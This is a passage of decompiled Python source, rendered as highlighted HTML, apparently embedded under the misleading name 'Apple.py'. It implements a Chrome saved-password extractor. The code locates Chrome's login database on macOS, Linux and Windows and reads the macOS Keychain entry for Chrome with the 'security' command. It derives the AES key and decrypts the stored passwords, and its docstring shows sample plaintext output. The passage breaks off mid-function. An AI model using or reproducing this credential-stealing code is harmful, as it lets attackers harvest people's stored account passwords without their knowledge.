</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4</span><span><span style="color:#75715e"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5</span><span><span style="color:#75715e"># Embedded file name: Apple.py</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6</span><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7</span><span><span style="color:#e6db74">Get unencrypted &#39;Saved Password&#39; from Google Chrome
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8</span><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9</span><span><span style="color:#e6db74">Example:
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10</span><span><span style="color:#e6db74">    &gt;&gt;&gt; import ChromePasswd
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11</span><span><span style="color:#e6db74">    &gt;&gt;&gt; chrome_pwd = ChromePasswd()
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12</span><span><span style="color:#e6db74">    &gt;&gt;&gt; print chrome_pwd.get_login_db
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13</span><span><span style="color:#e6db74">    /Users/x899/Library/Application Support/Google/Chrome/Default/
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14</span><span><span style="color:#e6db74">    
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15</span><span><span style="color:#e6db74">    &gt;&gt;&gt; chrome_pwd.get_pass(prettyprint=True)
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16</span><span><span style="color:#e6db74">        {
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17</span><span><span style="color:#e6db74">                &#34;data&#34;: [
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18</span><span><span style="color:#e6db74">                        {
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19</span><span><span style="color:#e6db74">                                &#34;url&#34;: &#34;https://x899.com/&#34;,
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20</span><span><span style="color:#e6db74">                                &#34;username&#34;: &#34;admin&#34;,
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21</span><span><span style="color:#e6db74">                                &#34;password&#34;: &#34;secretP@$$w0rD&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22</span><span><span style="color:#e6db74">                        },
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23</span><span><span style="color:#e6db74">                        {
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24</span><span><span style="color:#e6db74">                                &#34;url&#34;: &#34;https://accounts.google.com/&#34;,
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25</span><span><span style="color:#e6db74">                                &#34;username&#34;: &#34;x899@gmail.com&#34;,
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26</span><span><span style="color:#e6db74">                                &#34;password&#34;: &#34;@n04h3RP@$$m0rC1&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27</span><span><span style="color:#e6db74">                        }
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28</span><span><span style="color:#e6db74">                ]
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29</span><span><span style="color:#e6db74">        }
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30</span><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31</span><span><span style="color:#e6db74">TO DO:
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32</span><span><span style="color:#e6db74">    * Cookie support
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33</span><span><span style="color:#e6db74">    * Update database Password directly
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34</span><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35</span><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36</span><span><span style="color:#f92672">import</span> platform
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37</span><span><span style="color:#f92672">from</span> getpass <span style="color:#f92672">import</span> getuser
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38</span><span><span style="color:#f92672">from</span> shutil <span style="color:#f92672">import</span> copy
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39</span><span><span style="color:#f92672">import</span> sqlite3
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40</span><span><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> unlink
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41</span><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42</span><span><span style="color:#f92672">from</span> importlib <span style="color:#f92672">import</span> import_module
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43</span><span><span style="color:#f92672">import</span> string<span style="color:#f92672">,</span> sys<span style="color:#f92672">,</span> subprocess<span style="color:#f92672">,</span> glob<span style="color:#f92672">,</span> os
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45</span><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ChromePasswd</span>(object):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46</span><span>    <span style="color:#e6db74">&#34;&#34;&#34; Main ChromePasswd Class &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48</span><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49</span><span>        <span style="color:#e6db74">&#34;&#34;&#34; Constructor: determine target platform &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50</span><span>        self<span style="color:#f92672">.</span>target_os <span style="color:#f92672">=</span> platform<span style="color:#f92672">.</span>system()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51</span><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>target_os <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Darwin&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52</span><span>            self<span style="color:#f92672">.</span>mac_init()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53</span><span>        <span style="color:#66d9ef">elif</span> self<span style="color:#f92672">.</span>target_os <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Windows&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54</span><span>            self<span style="color:#f92672">.</span>win_init()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55</span><span>        <span style="color:#66d9ef">elif</span> self<span style="color:#f92672">.</span>target_os <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Linux&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56</span><span>            self<span style="color:#f92672">.</span>linux_init()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">import_libraries</span>(self):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59</span><span>        <span style="color:#e6db74">&#34;&#34;&#34; import libraries based on underlying platform &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60</span><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61</span><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>target_os <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Darwin&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62</span><span>                globals()[<span style="color:#e6db74">&#39;AES&#39;</span>] <span style="color:#f92672">=</span> import_module(<span style="color:#e6db74">&#39;Crypto.Cipher.AES&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63</span><span>                globals()[<span style="color:#e6db74">&#39;KDF&#39;</span>] <span style="color:#f92672">=</span> import_module(<span style="color:#e6db74">&#39;Crypto.Protocol.KDF&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64</span><span>                globals()[<span style="color:#e6db74">&#39;subprocess&#39;</span>] <span style="color:#f92672">=</span> import_module(<span style="color:#e6db74">&#39;subprocess&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65</span><span>            <span style="color:#66d9ef">elif</span> self<span style="color:#f92672">.</span>target_os <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Windows&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66</span><span>                globals()[<span style="color:#e6db74">&#39;win32crypt&#39;</span>] <span style="color:#f92672">=</span> import_module(<span style="color:#e6db74">&#39;win32crypt&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67</span><span>            <span style="color:#66d9ef">elif</span> self<span style="color:#f92672">.</span>target_os <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Linux&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68</span><span>                globals()[<span style="color:#e6db74">&#39;AES&#39;</span>] <span style="color:#f92672">=</span> import_module(<span style="color:#e6db74">&#39;Crypto.Cipher.AES&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69</span><span>                globals()[<span style="color:#e6db74">&#39;KDF&#39;</span>] <span style="color:#f92672">=</span> import_module(<span style="color:#e6db74">&#39;Crypto.Protocol.KDF&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70</span><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ImportError</span> <span style="color:#66d9ef">as</span> err:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71</span><span>            print (<span style="color:#e6db74">&#39;[-] Error: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>format(str(err))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72</span><span>            sys<span style="color:#f92672">.</span>exit()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">linux_init</span>(self):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75</span><span>        <span style="color:#e6db74">&#34;&#34;&#34; Linux Initialization Function &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76</span><span>        self<span style="color:#f92672">.</span>import_libraries()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77</span><span>        my_pass <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;peanuts&#39;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf8&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78</span><span>        iterations <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79</span><span>        salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;saltysalt&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80</span><span>        length <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81</span><span>        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> KDF<span style="color:#f92672">.</span>PBKDF2(my_pass, salt, length, iterations)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82</span><span>        self<span style="color:#f92672">.</span>dbpath <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;/home/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/.config/google-chrome/Default/&#39;</span>)<span style="color:#f92672">.</span>format(getuser())
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83</span><span>        self<span style="color:#f92672">.</span>decrypt_func <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>nix_decrypt
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mac_init</span>(self):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86</span><span>        <span style="color:#e6db74">&#34;&#34;&#34; Mac Initialization Function &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87</span><span>        self<span style="color:#f92672">.</span>import_libraries()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88</span><span>        my_pass <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(<span style="color:#e6db74">&#34;security find-generic-password -wa &#39;Chrome&#39;&#34;</span>, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89</span><span>        stdout, _ <span style="color:#f92672">=</span> my_pass<span style="color:#f92672">.</span>communicate()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90</span><span>        my_pass <span style="color:#f92672">=</span> stdout<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91</span><span>        iterations <span style="color:#f92672">=</span> <span style="color:#ae81ff">1003</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92</span><span>        salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;saltysalt&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93</span><span>        length <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94</span><span>        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> KDF<span style="color:#f92672">.</span>PBKDF2(my_pass, salt, length, iterations)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95</span><span>        loginData <span style="color:#f92672">=</span> glob<span style="color:#f92672">.</span>glob(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/Library/Application Support/Google/Chrome/Profile*/&#39;</span> <span style="color:#f92672">%</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>expanduser(<span style="color:#e6db74">&#39;~&#39;</span>))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96</span><span>        <span style="color:#66d9ef">if</span> len(loginData) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97</span><span>            loginData <span style="color:#f92672">=</span> glob<span style="color:#f92672">.</span>glob(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/Library/Application Support/Google/Chrome/Default/&#39;</span> <span style="color:#f92672">%</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>expanduser(<span style="color:#e6db74">&#39;~&#39;</span>))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98</span><span>        self<span style="color:#f92672">.</span>dbpath <span style="color:#f92672">=</span> loginData[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99</span><span>        self<span style="color:#f92672">.</span>decrypt_func <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>nix_decrypt
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">nix_decrypt</span>(self, enc_passwd):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102</span><span>        <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103</span><span><span style="color:#e6db74">        Linux and Mac&#39;s decryption function
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104</span><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105</span><span><span style="color:#e6db74">        :paran enc_passwd: encrypted password
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106</span><span><span style="color:#e6db74">        :return: decrypted password
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107</span><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108</span><span>        initialization_vector <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;                &#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109</span><span>        enc_passwd <span style="color:#f92672">=</span> enc_passwd[<span style="color:#ae81ff">3</span>:]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110</span><span>        cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>key, AES<span style="color:#f92672">.</span>MODE_CBC, IV<span style="color:#f92672">=</span>initialization_vector)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111</span><span>        decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(enc_passwd)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112</span><span>        <span style="color:#66d9ef">return</span> decrypted<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf8&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">win_init</span>(self):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115</span><span>        <span style="color:#e6db74">&#34;&#34;&#34; Windows Initialization Function &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116</span><span>        self<span style="color:#f92672">.</span>import_libraries()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117</span><span>        self<span style="color:#f92672">.</span>dbpath <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">AppData</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Local</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Google</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Chrome</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">User Data</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Default</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>format(getuser())
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118</span><span>        self<span style="color:#f92672">.</span>decrypt_func <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>win_decrypt
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">win_decrypt</span>(self, enc_passwd):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121</span><span>        <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122</span><span><span style="color:#e6db74">        Window&#39;s decryption function
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123</span><span><span style="color:#e6db74">
